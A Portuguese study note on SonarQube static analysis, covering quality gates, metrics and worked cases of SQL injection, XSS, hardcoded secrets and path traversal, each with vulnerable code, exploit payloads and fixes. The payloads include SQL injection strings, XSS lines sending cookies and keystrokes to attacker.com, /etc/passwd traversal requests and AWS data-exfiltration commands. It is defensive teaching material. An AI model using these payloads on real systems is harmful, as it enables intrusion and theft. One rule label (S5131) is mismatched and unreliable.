
Para o setup rápido, utilize o [[Containers]] com a imagem oficial.

### Resumo

#### SonarQube (Segurança no Código - SAST)

**O que é:** O SonarQube é uma ferramenta de **SAST** (Static Application Security Testing). Ele analisa o código-fonte "parado" (antes de ser compilado ou executado) em busca de bugs, vulnerabilidades de segurança e "code smells" (código mal escrito).

**A Analogia:** Imagine que você está escrevendo um livro. O SonarQube é como um **editor gramatical extremamente rigoroso**. Antes de você imprimir o livro (fazer o deploy), ele lê seu rascunho e marca em vermelho: "Aqui tem um erro de digitação", "Esta frase está ambígua" ou "Você usou uma palavra ofensiva aqui". Ele te impede de publicar algo com erros básicos.

**Como funciona no DevSecOps:** Geralmente, o SonarQube é integrado na esteira de CI/CD (Integração Contínua). Assim que o desenvolvedor sobe o código (git push), o SonarQube analisa. Se a nota de segurança for baixa (o chamado _Quality Gate_), ele bloqueia o processo e não deixa o código ir para produção.

**Exemplo Prático:** Um desenvolvedor esquece uma senha _hardcoded_ (escrita diretamente no código) dentro de um arquivo Java: `String password = "admin123";`. O SonarQube detecta isso imediatamente e alerta: "Risco de Segurança Crítico: Credencial exposta".

---

# SonarQube - Static Application Security Testing (SAST)

**Tags:** #sast #code-analysis #quality-gate #devsecops #sonarqube #static-analysis #shift-left
**Relacionado:** [[Tenable]], [[OWASP]], [[GitHub-Actions]], [[CI-CD]], [[Code-Quality]]

---

## 📋 Índice

1. [Conceitos Fundamentais](#conceitos-fundamentais-sonarqube)
2. [Análise Prática de Vulnerabilidades](#análise-prática-de-vulnerabilidades)
3. [Setup e Configuração](#setup-e-configuração)
4. [Workflow de Análise](#workflow-de-análise)
5. [Melhores Práticas](#melhores-práticas)

---

## 🎯 Conceitos Fundamentais SonarQube

### O que é SonarQube?

**SonarQube** é uma plataforma open-source de **Continuous Code Quality** que realiza **SAST** (Static Application Security Testing) - análise estática de código-fonte para identificar:

- 🐛 **Bugs** - Erros lógicos que causam comportamento inesperado
- 🔒 **Vulnerabilidades** - Falhas de segurança (OWASP Top 10, CWE)
- 💩 **Code Smells** - Código mal escrito que dificulta manutenção
- 📊 **Coverage** - Cobertura de testes unitários
- 📋 **Duplicações** - Código duplicado

**Arquitetura:**

```mermaid
graph LR
    A[Developer] -->|git push| B[GitHub/GitLab]
    B -->|trigger| C[CI/CD Pipeline]
    C -->|SonarScanner| D[SonarQube Server]
    D -->|analysis| E[PostgreSQL DB]
    D -->|report| F[Web Dashboard]
    F -->|Quality Gate| C
    C -->|fail/pass| G[Deployment]
````

**Produtos da família SonarSource:**

|Produto|Tipo|Uso|
|---|---|---|
|**SonarQube Community**|Self-hosted (free)|Análise de projetos open-source, até 15 linguagens|
|**SonarQube Developer**|Self-hosted (pago)|Branch analysis, PR decoration, mais linguagens|
|**SonarQube Enterprise**|Self-hosted (pago)|Portfolio management, security reports|
|**SonarCloud**|SaaS|Análise cloud-native, integração fácil|
|**SonarLint**|IDE Plugin|Análise em tempo real (VSCode, IntelliJ, Eclipse)|

---

### SAST vs DAST: Entendendo a Diferença

```yaml
SAST (Static - SonarQube):
  Quando: Durante o desenvolvimento (Shift-Left)
  O que analisa: Código-fonte (.java, .py, .js)
  Como: Análise sintática/semântica sem executar
  Vantagens: Detecta vulnerabilidades antes do deploy
  Limitações: Não detecta falhas de runtime/configuração
  
DAST (Dynamic - Tenable):
  Quando: Após deploy (aplicação rodando)
  O que analisa: Aplicação em execução (HTTP, APIs)
  Como: Testes de penetração automatizados
  Vantagens: Detecta falhas de infraestrutura/runtime
  Limitações: Não sabe onde está o código vulnerável
```

> **💡 Estratégia ideal:** Use **SAST + DAST** combinados. SonarQube previne vulnerabilidades no código, Tenable valida a segurança da infraestrutura.

---

### Métricas Fundamentais do SonarQube

#### 🎯 **Quality Gate**

**Definição:** Conjunto de **condições obrigatórias** que o código deve passar para ser aprovado no merge/deploy.

**Quality Gate padrão "Sonar Way":**

```yaml
Conditions:
  - Coverage: >= 80%
  - Duplicated Lines: < 3%
  - Maintainability Rating: >= A
  - Reliability Rating: >= A
  - Security Rating: >= A
  - Security Hotspots Reviewed: 100%
  - New Code:
      - Coverage on New Code: >= 80%
      - Duplicated Lines on New Code: < 3%
      - Bugs: 0
      - Vulnerabilities: 0
      - Code Smells: 0
```

**Status possíveis:**

```
✅ PASSED  - Todas as condições atendidas (pode fazer merge)
❌ FAILED  - Pelo menos 1 condição falhou (merge bloqueado)
⚠️ WARNING - Próximo do limite (não bloqueia, mas alerta)
```

**Exemplo de falha:**

```
Quality Gate: FAILED ❌

Conditions failed:
  ✗ Security Rating on New Code is E (required: A)
    └─ 3 new vulnerabilities introduced
  
  ✗ Coverage on New Code is 45% (required: >= 80%)
    └─ 234 new lines to cover, only 105 covered
  
  ✗ Duplicated Lines is 12% (required: < 3%)
    └─ 1,456 duplicated lines detected
```

---

#### 📊 **Security Rating (A-E)**

**Escala baseada na severidade das vulnerabilidades:**

|Rating|Vulnerabilidades|Descrição|
|---|---|---|
|**A**|0 vulnerabilities|Código seguro ✅|
|**B**|≥ 1 Minor|Vulnerabilidades de baixo impacto|
|**C**|≥ 1 Major|Vulnerabilidades de médio impacto|
|**D**|≥ 1 Critical|Vulnerabilidades graves|
|**E**|≥ 1 Blocker|Vulnerabilidades críticas (SQL Injection, XSS)|

**Cálculo:**

```
Rating = worst_severity(vulnerabilities)

Exemplo:
  - 0 Blockers
  - 2 Critical  ← Pior severidade
  - 5 Major
  - 12 Minor
  
  Result: Security Rating = D
```

---

#### 🔬 **Coverage (Cobertura de Testes)**

**Definição:** Porcentagem de **linhas de código** executadas pelos testes unitários.

**Fórmula:**

```
Coverage = (lines_covered / total_executable_lines) × 100

Exemplo:
  Total Lines: 1,000
  Lines Covered by Tests: 850
  Coverage: 85%
```

**Métricas detalhadas:**

```yaml
Line Coverage: 85%
  ✓ Lines to Cover: 1,000
  ✓ Uncovered Lines: 150
  
Branch Coverage: 72%
  ✓ Conditions to Cover: 240
  ✓ Uncovered Conditions: 67
  
  Exemplo de branch:
    if (user.isAdmin() || user.hasPermission("DELETE")) {
      deleteResource();  ← Branch 1
    } else {
      throwError();      ← Branch 2
    }
    # Coverage = 50% se apenas 1 branch foi testada
```

> **⚠️ Mito:** "100% de coverage = código perfeito". Coverage mede **quantidade**, não **qualidade** dos testes.

---

#### 💩 **Technical Debt**

**Definição:** Tempo estimado para corrigir todos os **Code Smells** do projeto.

**Cálculo:**

```
Technical Debt = Σ (remediation_effort_per_issue)

Ratings:
  A: ≤ 5% do tempo de desenvolvimento
  B: 6-10%
  C: 11-20%
  D: 21-50%
  E: > 50%
```

**Exemplo:**

```yaml
Project: my-ecommerce-api
Total Issues: 1,247

Breakdown:
  - 456 Code Smells (Maintainability)
    └─ Estimated effort: 12d 4h
  - 23 Bugs (Reliability)
    └─ Estimated effort: 1d 6h
  - 8 Vulnerabilities (Security)
    └─ Estimated effort: 8h
    
Total Technical Debt: 13d 18h

Development Time: 180 days
Debt Ratio: 7.6% (Rating: B)
```

**Estratégia de redução:**

```yaml
Sprint Planning:
  - 80% features novas
  - 20% pagamento de dívida técnica
  
Exemplo:
  Sprint capacity: 100 story points
  - 80 pts: Desenvolver novas funcionalidades
  - 20 pts: Corrigir code smells do backlog
```

---

### Issues vs Security Hotspots

O SonarQube categoriza problemas em **duas classes distintas**:

#### 🐛 **ISSUES** (Certeza de problema)

```yaml
Definição: Problemas confirmados que DEVEM ser corrigidos

Tipos:
  - Bug: Erro lógico confirmado
  - Vulnerability: Falha de segurança comprovada
  - Code Smell: Má prática de código
  
Ação: Corrigir imediatamente
Bloqueio: Pode falhar Quality Gate
```

**Exemplo de Issue (Vulnerability):**

```java
// ❌ VULNERABILITY - SQL Injection (Blocker)
String query = "SELECT * FROM users WHERE username = '" + userInput + "'";
stmt.execute(query);

// SonarQube detecta: Tainted input (userInput) used in SQL query
```

---

#### 🔥 **SECURITY HOTSPOTS** (Requer revisão manual)

```yaml
Definição: Código sensível à segurança que PODE ser vulnerável

Características:
  - Não é necessariamente vulnerável
  - Requer análise contextual do desenvolvedor
  - Deve ser revisado e marcado como "Safe" ou "Fix needed"
  
Ação: Revisar + Justificar
Bloqueio: Quality Gate exige 100% revisado
```

**Exemplo de Security Hotspot:**

```python
# 🔥 SECURITY HOTSPOT - Weak Cryptography
import hashlib

password_hash = hashlib.md5(password.encode()).hexdigest()

# SonarQube detecta: MD5 is weak, review if acceptable
# 
# Análise do dev:
# ✓ SAFE: Usado apenas para ETag de cache, não para senha
# ✗ FIX: Usado para hash de senha → Trocar para bcrypt
```

**Workflow de Hotspot:**

```mermaid
graph TD
    A[Hotspot Detectado] --> B{Revisar Contexto}
    B -->|Uso seguro| C[Marcar como SAFE]
    B -->|Uso inseguro| D[Marcar como TO_REVIEW]
    C --> E[Adicionar comentário justificando]
    D --> F[Criar Issue de correção]
    F --> G[Corrigir código]
```

---

## 🔬 Análise Prática de Vulnerabilidades

### A) SQL Injection (OWASP A03:2021)

#### 📌 Descrição da Vulnerabilidade

**Nome:** SQL Injection via String Concatenation  
**CWE:** CWE-89 (Improper Neutralization of Special Elements)  
**Severidade:** **BLOCKER**  
**OWASP:** A03:2021 - Injection  
**Regra SonarQube:** `java:S3649`, `python:S3649`

**O que é:**

Vulnerabilidade que permite a um atacante **manipular queries SQL** através de input malicioso, possibilitando:

- Bypass de autenticação
- Exfiltração de dados
- Modificação/deleção de dados
- Execução de comandos no banco

---

#### 🧪 Código Vulnerável Detectado

**Java - Exemplo 1 (Authentication Bypass):**

```java
// ❌ VULNERABILITY BLOCKER - SQL Injection
public User authenticate(String username, String password) {
    String query = "SELECT * FROM users WHERE username = '" + 
                   username + "' AND password = '" + password + "'";
    
    ResultSet rs = statement.executeQuery(query);
    
    if (rs.next()) {
        return new User(rs.getString("id"), rs.getString("username"));
    }
    return null;
}
```

**SonarQube Detection:**

```yaml
Issue Details:
  Rule: java:S3649 "Database queries should not be vulnerable to injection attacks"
  Severity: BLOCKER
  Type: VULNERABILITY
  
Message: |
  This SQL query is constructed by concatenating a string with user input.
  Make sure that executing this SQL query is safe here.
  
Location:
  File: AuthService.java
  Line: 23
  
Tainted Flow:
  1. User input: username (parameter at line 22)
  2. Concatenated into: query (line 23)
  3. Executed by: statement.executeQuery() (line 26)
  
CWE: CWE-89
OWASP: A03:2021 - Injection
```

---

#### 💉 Payload de Exploração

**Attack Scenario:**

```http
POST /api/login HTTP/1.1
Content-Type: application/json

{
  "username": "admin' OR '1'='1",
  "password": "anything"
}
```

**Query resultante:**

```sql
SELECT * FROM users 
WHERE username = 'admin' OR '1'='1' AND password = 'anything'
```

**Análise da injeção:**

```sql
-- Query quebrada em partes:
SELECT * FROM users 
WHERE username = 'admin'     ← Sempre FALSE (provavelmente não existe)
   OR '1'='1'                ← Sempre TRUE (injected)
   AND password = 'anything' ← Ignorado pela precedência do OR

-- Resultado: Retorna TODOS os usuários (primeiro = admin)
```

**Exploits avançados:**

```sql
-- 1. Exfiltração de dados
username: admin' UNION SELECT null, username, password FROM admin_users--

-- 2. Blind SQL Injection
username: admin' AND SLEEP(5)--

-- 3. Stacked queries (MySQL)
username: admin'; DROP TABLE users; --
```

---

#### 📤 Output (Como o SonarQube reporta)

**Dashboard do SonarQube:**

```
┌────────────────────────────────────────────────────────────┐
│ Security Issues: 1 Blocker                                 │
├────────────────────────────────────────────────────────────┤
│                                                            │
│ 🔴 SQL Injection in AuthService.authenticate()            │
│                                                            │
│ File: src/main/java/com/company/AuthService.java:23       │
│                                                            │
│ Issue:                                                     │
│ ┌──────────────────────────────────────────────────────┐  │
│ │ 22 | public User authenticate(String username, ...) { │  │
│ │ 23 | String query = "SELECT * FROM users WHERE ..." + │  │
│ │    |                username + "' AND password = '" + │  │
│ │    |                password + "'";                   │  │
│ │    |                ^^^^^^^^ ← Tainted input          │  │
│ │ 24 | ResultSet rs = statement.executeQuery(query);   │  │
│ │    |                                        ^^^^^ ← Sink│ │
│ └──────────────────────────────────────────────────────┘  │
│                                                            │
│ Why is this an issue?                                      │
│ User-controlled data is used directly in SQL query         │
│ construction without proper sanitization or parameterization│
│                                                            │
│ How to fix:                                                │
│ Use PreparedStatement with parameter binding               │
└────────────────────────────────────────────────────────────┘
```

---

#### 🛠️ Remediação

**✅ Código Corrigido (PreparedStatement):**

```java
// ✅ SECURE - Using PreparedStatement
public User authenticate(String username, String password) {
    String query = "SELECT * FROM users WHERE username = ? AND password = ?";
    
    try (PreparedStatement pstmt = connection.prepareStatement(query)) {
        pstmt.setString(1, username);  // Parameter binding (safe)
        pstmt.setString(2, password);
        
        ResultSet rs = pstmt.executeQuery();
        
        if (rs.next()) {
            return new User(rs.getString("id"), rs.getString("username"));
        }
    } catch (SQLException e) {
        logger.error("Authentication failed", e);
    }
    
    return null;
}
```

**Por que é seguro:**

```
PreparedStatement:
  1. Separa ESTRUTURA da query de DADOS
  2. Faz escape automático de caracteres especiais
  3. Previne alteração da lógica SQL
  
Query executada:
  SELECT * FROM users 
  WHERE username = 'admin\' OR \'1\'=\'1'  ← Tratado como string literal
    AND password = 'anything'
  
  Resultado: 0 rows (username não existe)
```

**SonarQube após correção:**

```
✅ Issue RESOLVED

Resolution: FIXED
Changed by: developer@company.com
Date: 2024-02-10

Security Rating: A (was: E)
```

---

### B) Cross-Site Scripting (XSS) (OWASP A03:2021)

#### 📌 Descrição da Vulnerabilidade

**Nome:** Cross-Site Scripting (Stored XSS)  
**CWE:** CWE-79 (Improper Neutralization of Input)  
**Severidade:** **BLOCKER**  
**OWASP:** A03:2021 - Injection  
**Regra SonarQube:** `javascript:S5131`, `typescript:S5131`

---

#### 🧪 Código Vulnerável Detectado

**React - Exemplo (Stored XSS):**

```jsx
// ❌ VULNERABILITY BLOCKER - XSS via dangerouslySetInnerHTML
import React from 'react';

function CommentSection({ comments }) {
  return (
    <div className="comments">
      {comments.map(comment => (
        <div 
          key={comment.id} 
          className="comment"
          dangerouslySetInnerHTML={{ __html: comment.content }}
        />
      ))}
    </div>
  );
}

export default CommentSection;
```

**SonarQube Detection:**

```yaml
Issue Details:
  Rule: javascript:S5131 "Allowing browsers to perform DNS prefetching is security-sensitive"
  Severity: BLOCKER
  Type: VULNERABILITY
  
Message: |
  Make sure using 'dangerouslySetInnerHTML' is safe here.
  User-provided data should not be rendered as HTML without sanitization.
  
Location:
  File: CommentSection.jsx
  Line: 8-10
  
Tainted Flow:
  1. User input: comment.content (from database)
  2. Rendered as HTML: dangerouslySetInnerHTML (line 9)
  3. Executed in browser: XSS payload
```

---

#### 💉 Payload de Exploração

**Attack Scenario:**

```javascript
// Atacante posta comentário malicioso:
POST /api/comments
{
  "content": "<img src=x onerror='alert(document.cookie)'>"
}
```

**Quando a vítima carrega a página:**

```html
<!-- HTML renderizado -->
<div class="comment">
  <img src=x onerror='alert(document.cookie)'>
</div>
```

**Execução:**

```javascript
// Browser executa:
onerror='alert(document.cookie)'

// Cookie exfiltrado:
"session_id=abc123; auth_token=xyz789"
```

**Payloads avançados:**

```html
<!-- 1. Cookie Stealer -->
<img src=x onerror='fetch("https://attacker.com/steal?c="+document.cookie)'>

<!-- 2. Keylogger -->
<script>
document.onkeypress = function(e) {
  fetch('https://attacker.com/log?key=' + e.key);
}
</script>

<!-- 3. Phishing Overlay -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
  <form action="https://attacker.com/phish" method="POST">
    <input name="password" placeholder="Session expired, re-enter password">
    <button>Login</button>
  </form>
</div>
```

---

#### 📤 Output do SonarQube

```
┌─────────────────────────────────────────────────────────────┐
│ 🔴 Cross-Site Scripting (XSS) in CommentSection.jsx        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│ Code:                                                       │
│ ┌───────────────────────────────────────────────────────┐  │
│ │ 7  | {comments.map(comment => (                       │  │
│ │ 8  |   <div                                           │  │
│ │ 9  |     dangerouslySetInnerHTML={{ __html:           │  │
│ │ 10 |       comment.content }}  ← Unsafe rendering     │  │
│ │    |       ^^^^^^^^^^^^^^^ Tainted data               │  │
│ │ 11 |   />                                             │  │
│ └───────────────────────────────────────────────────────┘  │
│                                                             │
│ Impact:                                                     │
│ - Cookie theft (session hijacking)                          │
│ - Keylogging                                                │
│ - Phishing attacks                                          │
│ - Defacement                                                │
│                                                             │
│ Recommendation:                                             │
│ Use React's default escaping (remove dangerouslySetInnerHTML)│
│ OR sanitize with DOMPurify library                          │
└─────────────────────────────────────────────────────────────┘
```

---

#### 🛠️ Remediação

**Opção 1 - Renderização Segura (Recomendado):**

```jsx
// ✅ SECURE - React auto-escapes by default
function CommentSection({ comments }) {
  return (
    <div className="comments">
      {comments.map(comment => (
        <div key={comment.id} className="comment">
          {comment.content}  {/* Auto-escaped */}
        </div>
      ))}
    </div>
  );
}

// Payload malicioso é renderizado como texto:
// <img src=x onerror='alert(1)'>  ← Visível como texto, não executa
```

**Opção 2 - Sanitização com DOMPurify:**

```jsx
// ✅ SECURE - Sanitized HTML rendering
import DOMPurify from 'dompurify';

function CommentSection({ comments }) {
  return (
    <div className="comments">
      {comments.map(comment => (
        <div 
          key={comment.id} 
          className="comment"
          dangerouslySetInnerHTML={{ 
            __html: DOMPurify.sanitize(comment.content, {
              ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
              ALLOWED_ATTR: ['href']
            })
          }}
        />
      ))}
    </div>
  );
}

// Payload malicioso é sanitizado:
// Input:  <img src=x onerror='alert(1)'><b>Hello</b>
// Output: <b>Hello</b>  ← <img> removido
```

---

### C) Hardcoded Secrets (CWE-798)

#### 📌 Descrição da Vulnerabilidade

**Nome:** Hard-Coded Credentials  
**CWE:** CWE-798 (Use of Hard-coded Credentials)  
**Severidade:** **CRITICAL**  
**OWASP:** A07:2021 - Identification and Authentication Failures  
**Regra SonarQube:** `java:S2068`, `python:S6290`

---

#### 🧪 Código Vulnerável Detectado

**Python - Exemplo:**

```python
# ❌ VULNERABILITY CRITICAL - Hardcoded Password
import psycopg2

def connect_to_database():
    connection = psycopg2.connect(
        host="prod-db.company.com",
        database="customers",
        user="admin",
        password="P@ssw0rd123!",  # ← HARDCODED SECRET
        port=5432
    )
    return connection

# AWS Credentials hardcoded
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
```

**SonarQube Detection:**

```yaml
Issue 1:
  Rule: python:S6290 "AWS credentials should not be hard-coded"
  Severity: CRITICAL
  Message: |
    Make sure this AWS Access Key ID is not hard-coded.
    Credentials should be stored in environment variables or secret managers.
  
  Location: Line 11
  
Issue 2:
  Rule: python:S2068 "Credentials should not be hard-coded"
  Severity: CRITICAL
  Message: |
    'password' detected in this expression, review this potentially hard-coded credential.
  
  Location: Line 7
```

---

#### 💉 Exploração (Impacto)

**Cenário 1 - Vazamento via Git:**

```bash
# Desenvolvedor commitou código com secret
git commit -m "Fix database connection"
git push origin main

# Secret agora está no histórico do Git PERMANENTEMENTE
git log -p | grep -i password
# commit a3f7c8e9d2b1...
# +    password="P@ssw0rd123!",
```

**Ferramentas de scanning automatizado:**

```yaml
GitHub Secret Scanning:
  - Detecta 200+ tipos de secrets (AWS, GCP, Stripe, etc)
  - Notifica fornecedor (AWS revoga automaticamente)
  - Alerta repositório público em minutos
  
GitGuardian:
  - Scan em tempo real de commits
  - 6 MILHÕES de secrets detectados publicamente (2023)
  
TruffleHog:
  - Scan de histórico Git completo
  - Detecção de high-entropy strings
```

**Cenário 2 - Impacto de credencial AWS:**

```bash
# Atacante usa credencial vazada
aws s3 ls --profile stolen-creds
# → Lista todos os buckets S3

aws s3 sync s3://company-backups /tmp/exfiltrate
# → Exfiltra 500GB de dados de clientes

aws ec2 run-instances --image-id ami-123456 --instance-type p3.16xlarge
# → Cria instâncias GPU para mineração de cripto
# → Custo: $24,000/mês
```

---

#### 📤 Output do SonarQube

```
┌──────────────────────────────────────────────────────────────┐
│ 🔴 Hard-Coded Credentials Detected                           │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│ File: database.py                                            │
│                                                              │
│ ┌────────────────────────────────────────────────────────┐  │
│ │  5 | def connect_to_database():                        │  │
│ │  6 |     connection = psycopg2.connect(                │  │
│ │  7 |         password="P@ssw0rd123!",  ← CRITICAL      │  │
│ │    |                  ^^^^^^^^^^^^^^                   │  │
│ │  8 |         host="prod-db.company.com"                │  │
│ │  9 |     )                                             │  │
│ └────────────────────────────────────────────────────────┘  │
│                                                              │
│ Risk:                                                        │
│ - Credential exposed in version control (Git)                │
│ - Anyone with repository access can see password             │
│ - Password cannot be rotated without code change             │
│                                                              │
│ Recommended Fix:                                             │
│ - Use environment variables (os.getenv)                      │
│ - Use secret managers (AWS Secrets Manager, Vault)           │
│ - NEVER commit secrets to version control                    │
└──────────────────────────────────────────────────────────────┘
```

---

#### 🛠️ Remediação

**✅ Opção 1 - Environment Variables:**

```python
# ✅ SECURE - Using environment variables
import os
import psycopg2

def connect_to_database():
    connection = psycopg2.connect(
        host=os.getenv("DB_HOST"),
        database=os.getenv("DB_NAME"),
        user=os.getenv("DB_USER"),
        password=os.getenv("DB_PASSWORD"),  # ✓ From env
        port=int(os.getenv("DB_PORT", 5432))
    )
    return connection

# AWS Credentials from env
AWS_ACCESS_KEY = os.getenv("AWS_ACCESS_KEY_ID")
AWS_SECRET_KEY = os.getenv("AWS_SECRET_ACCESS_KEY")
```

**Configuração no deployment:**

```bash
# .env (NUNCA commitado no Git)
DB_HOST=prod-db.company.com
DB_NAME=customers
DB_USER=admin
DB_PASSWORD=P@ssw0rd123!

# Carregar no runtime
export $(cat .env | xargs)
python app.py
```

**✅ Opção 2 - AWS Secrets Manager:**

```python
# ✅ SECURE - Using AWS Secrets Manager
import boto3
import json

def get_database_credentials():
    client = boto3.client('secretsmanager', region_name='us-east-1')
    
    response = client.get_secret_value(SecretId='prod/database/credentials')
    secret = json.loads(response['SecretString'])
    
    return secret

def connect_to_database():
    creds = get_database_credentials()
    
    connection = psycopg2.connect(
        host=creds['host'],
        database=creds['database'],
        user=creds['username'],
        password=creds['password'],  # ✓ Retrieved from Secrets Manager
        port=creds['port']
    )
    return connection
```

**Vantagens:**

```yaml
Secrets Manager:
  ✓ Rotação automática de credenciais
  ✓ Auditoria (CloudTrail logs)
  ✓ Criptografia em repouso (KMS)
  ✓ Controle de acesso granular (IAM)
  ✓ Versionamento de secrets
```

---

### D) Path Traversal (CWE-22)

#### 📌 Descrição da Vulnerabilidade

**Nome:** Path Traversal / Directory Traversal  
**CWE:** CWE-22 (Improper Limitation of Pathname)  
**Severidade:** **BLOCKER**  
**OWASP:** A01:2021 - Broken Access Control  
**Regra SonarQube:** `java:S2083`, `python:S5147`

---

#### 🧪 Código Vulnerável Detectado

**Java - Spring Boot:**

```java
// ❌ VULNERABILITY BLOCKER - Path Traversal
@RestController
public class FileController {
    
    private static final String BASE_PATH = "/var/www/uploads/";
    
    @GetMapping("/download")
    public ResponseEntity<Resource> downloadFile(
        @RequestParam String filename  // ← User input
    ) {
        File file = new File(BASE_PATH + filename);  // ← Concatenation
        
        if (!file.exists()) {
            return ResponseEntity.notFound().build();
        }
        
        Resource resource = new FileSystemResource(file);
        return ResponseEntity.ok()
                .header(HttpHeaders.CONTENT_DISPOSITION, 
                       "attachment; filename=\"" + filename + "\"")
                .body(resource);
    }
}
```

**SonarQube Detection:**

```yaml
Issue:
  Rule: java:S2083 "I/O function calls should not be vulnerable to path injection attacks"
  Severity: BLOCKER
  Type: VULNERABILITY
  
Message: |
  Make sure the "filename" value can't be used to access unauthorized files.
  User input should be validated before using in file operations.
  
Tainted Flow:
  1. Source: @RequestParam filename (line 8)
  2. Propagation: BASE_PATH + filename (line 9)
  3. Sink: new File() (line 9)
```

---

#### 💉 Payload de Exploração

**Attack Scenario 1 - Leitura de /etc/passwd:**

```http
GET /download?filename=../../../../etc/passwd HTTP/1.1
Host: api.company.com
```

**Path resultante:**

```bash
/var/www/uploads/ + ../../../../etc/passwd
= /var/www/uploads/../../../../etc/passwd
= /etc/passwd  # ← Path Traversal!
```

**Conteúdo retornado:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
postgres:x:113:118:PostgreSQL:/var/lib/postgresql:/bin/bash
```

**Attack Scenario 2 - Exfiltração de Secrets:**

```http
GET /download?filename=../../../app/config/application.properties HTTP/1.1
```

**Arquivo retornado:**

```properties
# application.properties
spring.datasource.url=jdbc:postgresql://prod-db:5432/customers
spring.datasource.username=admin
spring.datasource.password=SuperSecret123!

jwt.secret=aGVsbG8td29ybGQtc3VwZXItc2VjcmV0LWtleQ==
stripe.api.key=sk_live_51K7XYZ...
```

**Attack Scenario 3 - Leitura de código-fonte:**

```http
GET /download?filename=../../../src/main/java/com/company/AuthService.java
```

---

#### 📤 Output do SonarQube

```
┌────────────────────────────────────────────────────────────────┐
│ 🔴 Path Traversal in FileController.downloadFile()            │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│ ┌──────────────────────────────────────────────────────────┐  │
│ │  7 | @GetMapping("/download")                           │  │
│ │  8 | public ResponseEntity<Resource> downloadFile(      │  │
│ │  9 |     @RequestParam String filename) {               │  │
│ │    |                          ^^^^^^^^ Source           │  │
│ │ 10 |     File file = new File(BASE_PATH + filename);    │  │
│ │    |                 ^^^^^^^^              ^^^^^^^^ Sink│  │
│ │ 11 |     Resource resource = new FileSystemResource...  │  │
│ └──────────────────────────────────────────────────────────┘  │
│                                                                │
│ Attack Vector:                                                 │
│ GET /download?filename=../../../../etc/passwd                  │
│                                                                │
│ Impact:                                                        │
│ - Read arbitrary files (config, source code, secrets)          │
│ - Access sensitive system files (/etc/passwd, /etc/shadow)     │
│ - Lateral movement (read SSH keys, AWS credentials)            │
└────────────────────────────────────────────────────────────────┘
```

---

#### 🛠️ Remediação

**✅ Opção 1 - Validação Whitelist:**

```java
// ✅ SECURE - Whitelist validation
@GetMapping("/download")
public ResponseEntity<Resource> downloadFile(
    @RequestParam String filename
) {
    // 1. Validar caracteres permitidos
    if (!filename.matches("^[a-zA-Z0-9._-]+$")) {
        throw new IllegalArgumentException("Invalid filename");
    }
    
    // 2. Resolver caminho absoluto
    Path basePath = Paths.get(BASE_PATH).toAbsolutePath().normalize();
    Path filePath = basePath.resolve(filename).normalize();
    
    // 3. Verificar se está dentro do diretório permitido
    if (!filePath.startsWith(basePath)) {
        throw new SecurityException("Access denied");
    }
    
    File file = filePath.toFile();
    
    if (!file.exists() || !file.isFile()) {
        return ResponseEntity.notFound().build();
    }
    
    Resource resource = new FileSystemResource(file);
    return ResponseEntity.ok()
            .header(HttpHeaders.CONTENT_DISPOSITION, 
                   "attachment; filename=\"" + filename + "\"")
            .body(resource);
}
```

**Por que é seguro:**

```bash
# Tentativa de ataque:
filename = "../../../../etc/passwd"

# Passo 1: Validação regex
"../../../../etc/passwd" !~ ^[a-zA-Z0-9._-]+$  ← REJEITADO (contém '/')

# Passo 2 (se passar): Normalização
basePath = /var/www/uploads
filePath = /var/www/uploads/../../../../etc/passwd
         → normalize() → /etc/passwd

# Passo 3: Verificação de prefixo
/etc/passwd.startsWith(/var/www/uploads) → FALSE ← BLOQUEADO
```

**✅ Opção 2 - UUID Mapping:**

```java
// ✅ SECURE - Indirect file access via UUID
@RestController
public class FileController {
    
    @Autowired
    private FileRepository fileRepository;
    
    @GetMapping("/download/{fileId}")
    public ResponseEntity<Resource> downloadFile(
        @PathVariable UUID fileId  // ← UUID, não filename
    ) {
        // Buscar metadata do banco
        FileMetadata metadata = fileRepository.findById(fileId)
                .orElseThrow(() -> new FileNotFoundException());
        
        // Caminho é armazenado no DB, não fornecido pelo usuário
        Path filePath = Paths.get(metadata.getStoragePath());
        Resource resource = new FileSystemResource(filePath.toFile());
        
        return ResponseEntity.ok()
                .header(HttpHeaders.CONTENT_DISPOSITION, 
                       "attachment; filename=\"" + metadata.getOriginalName() + "\"")
                .body(resource);
    }
}
```

**Tabela de mapeamento:**

```sql
CREATE TABLE file_metadata (
    id UUID PRIMARY KEY,
    original_name VARCHAR(255),
    storage_path VARCHAR(500),  -- /var/www/uploads/abc123.pdf
    owner_id BIGINT,
    created_at TIMESTAMP
);

-- Exemplo de registro:
INSERT INTO file_metadata VALUES (
    'f47ac10b-58cc-4372-a567-0e02b2c3d479',
    'invoice.pdf',
    '/var/www/uploads/2024/02/f47ac10b.pdf',
    12345,
    '2024-02-10 10:30:00'
);
```

**Acesso seguro:**

```http
GET /download/f47ac10b-58cc-4372-a567-0e02b2c3d479 HTTP/1.1

# Atacante NÃO pode manipular o path
# Mesmo com input malicioso:
GET /download/../../../../etc/passwd
→ 404 Not Found (UUID inválido)
```

---

## ⚙️ Setup e Configuração

### 🐳 SonarQube Server (Docker)

#### Instalação via Docker Compose

**Passo 1 - Criar `docker-compose.yml`:**

```yaml
version: "3.8"

services:
  sonarqube:
    image: sonarqube:10.4-community  # Última versão LTS
    container_name: sonarqube
    depends_on:
      - db
    environment:
      SONAR_JDBC_URL: jdbc:postgresql://db:5432/sonar
      SONAR_JDBC_USERNAME: sonar
      SONAR_JDBC_PASSWORD: sonar_password
    volumes:
      - sonarqube_data:/opt/sonarqube/data
      - sonarqube_extensions:/opt/sonarqube/extensions
      - sonarqube_logs:/opt/sonarqube/logs
    ports:
      - "9000:9000"
    networks:
      - sonarnet
    ulimits:
      nofile:
        soft: 65536
        hard: 65536

  db:
    image: postgres:15-alpine
    container_name: sonarqube_db
    environment:
      POSTGRES_USER: sonar
      POSTGRES_PASSWORD: sonar_password
      POSTGRES_DB: sonar
    volumes:
      - postgresql_data:/var/lib/postgresql/data
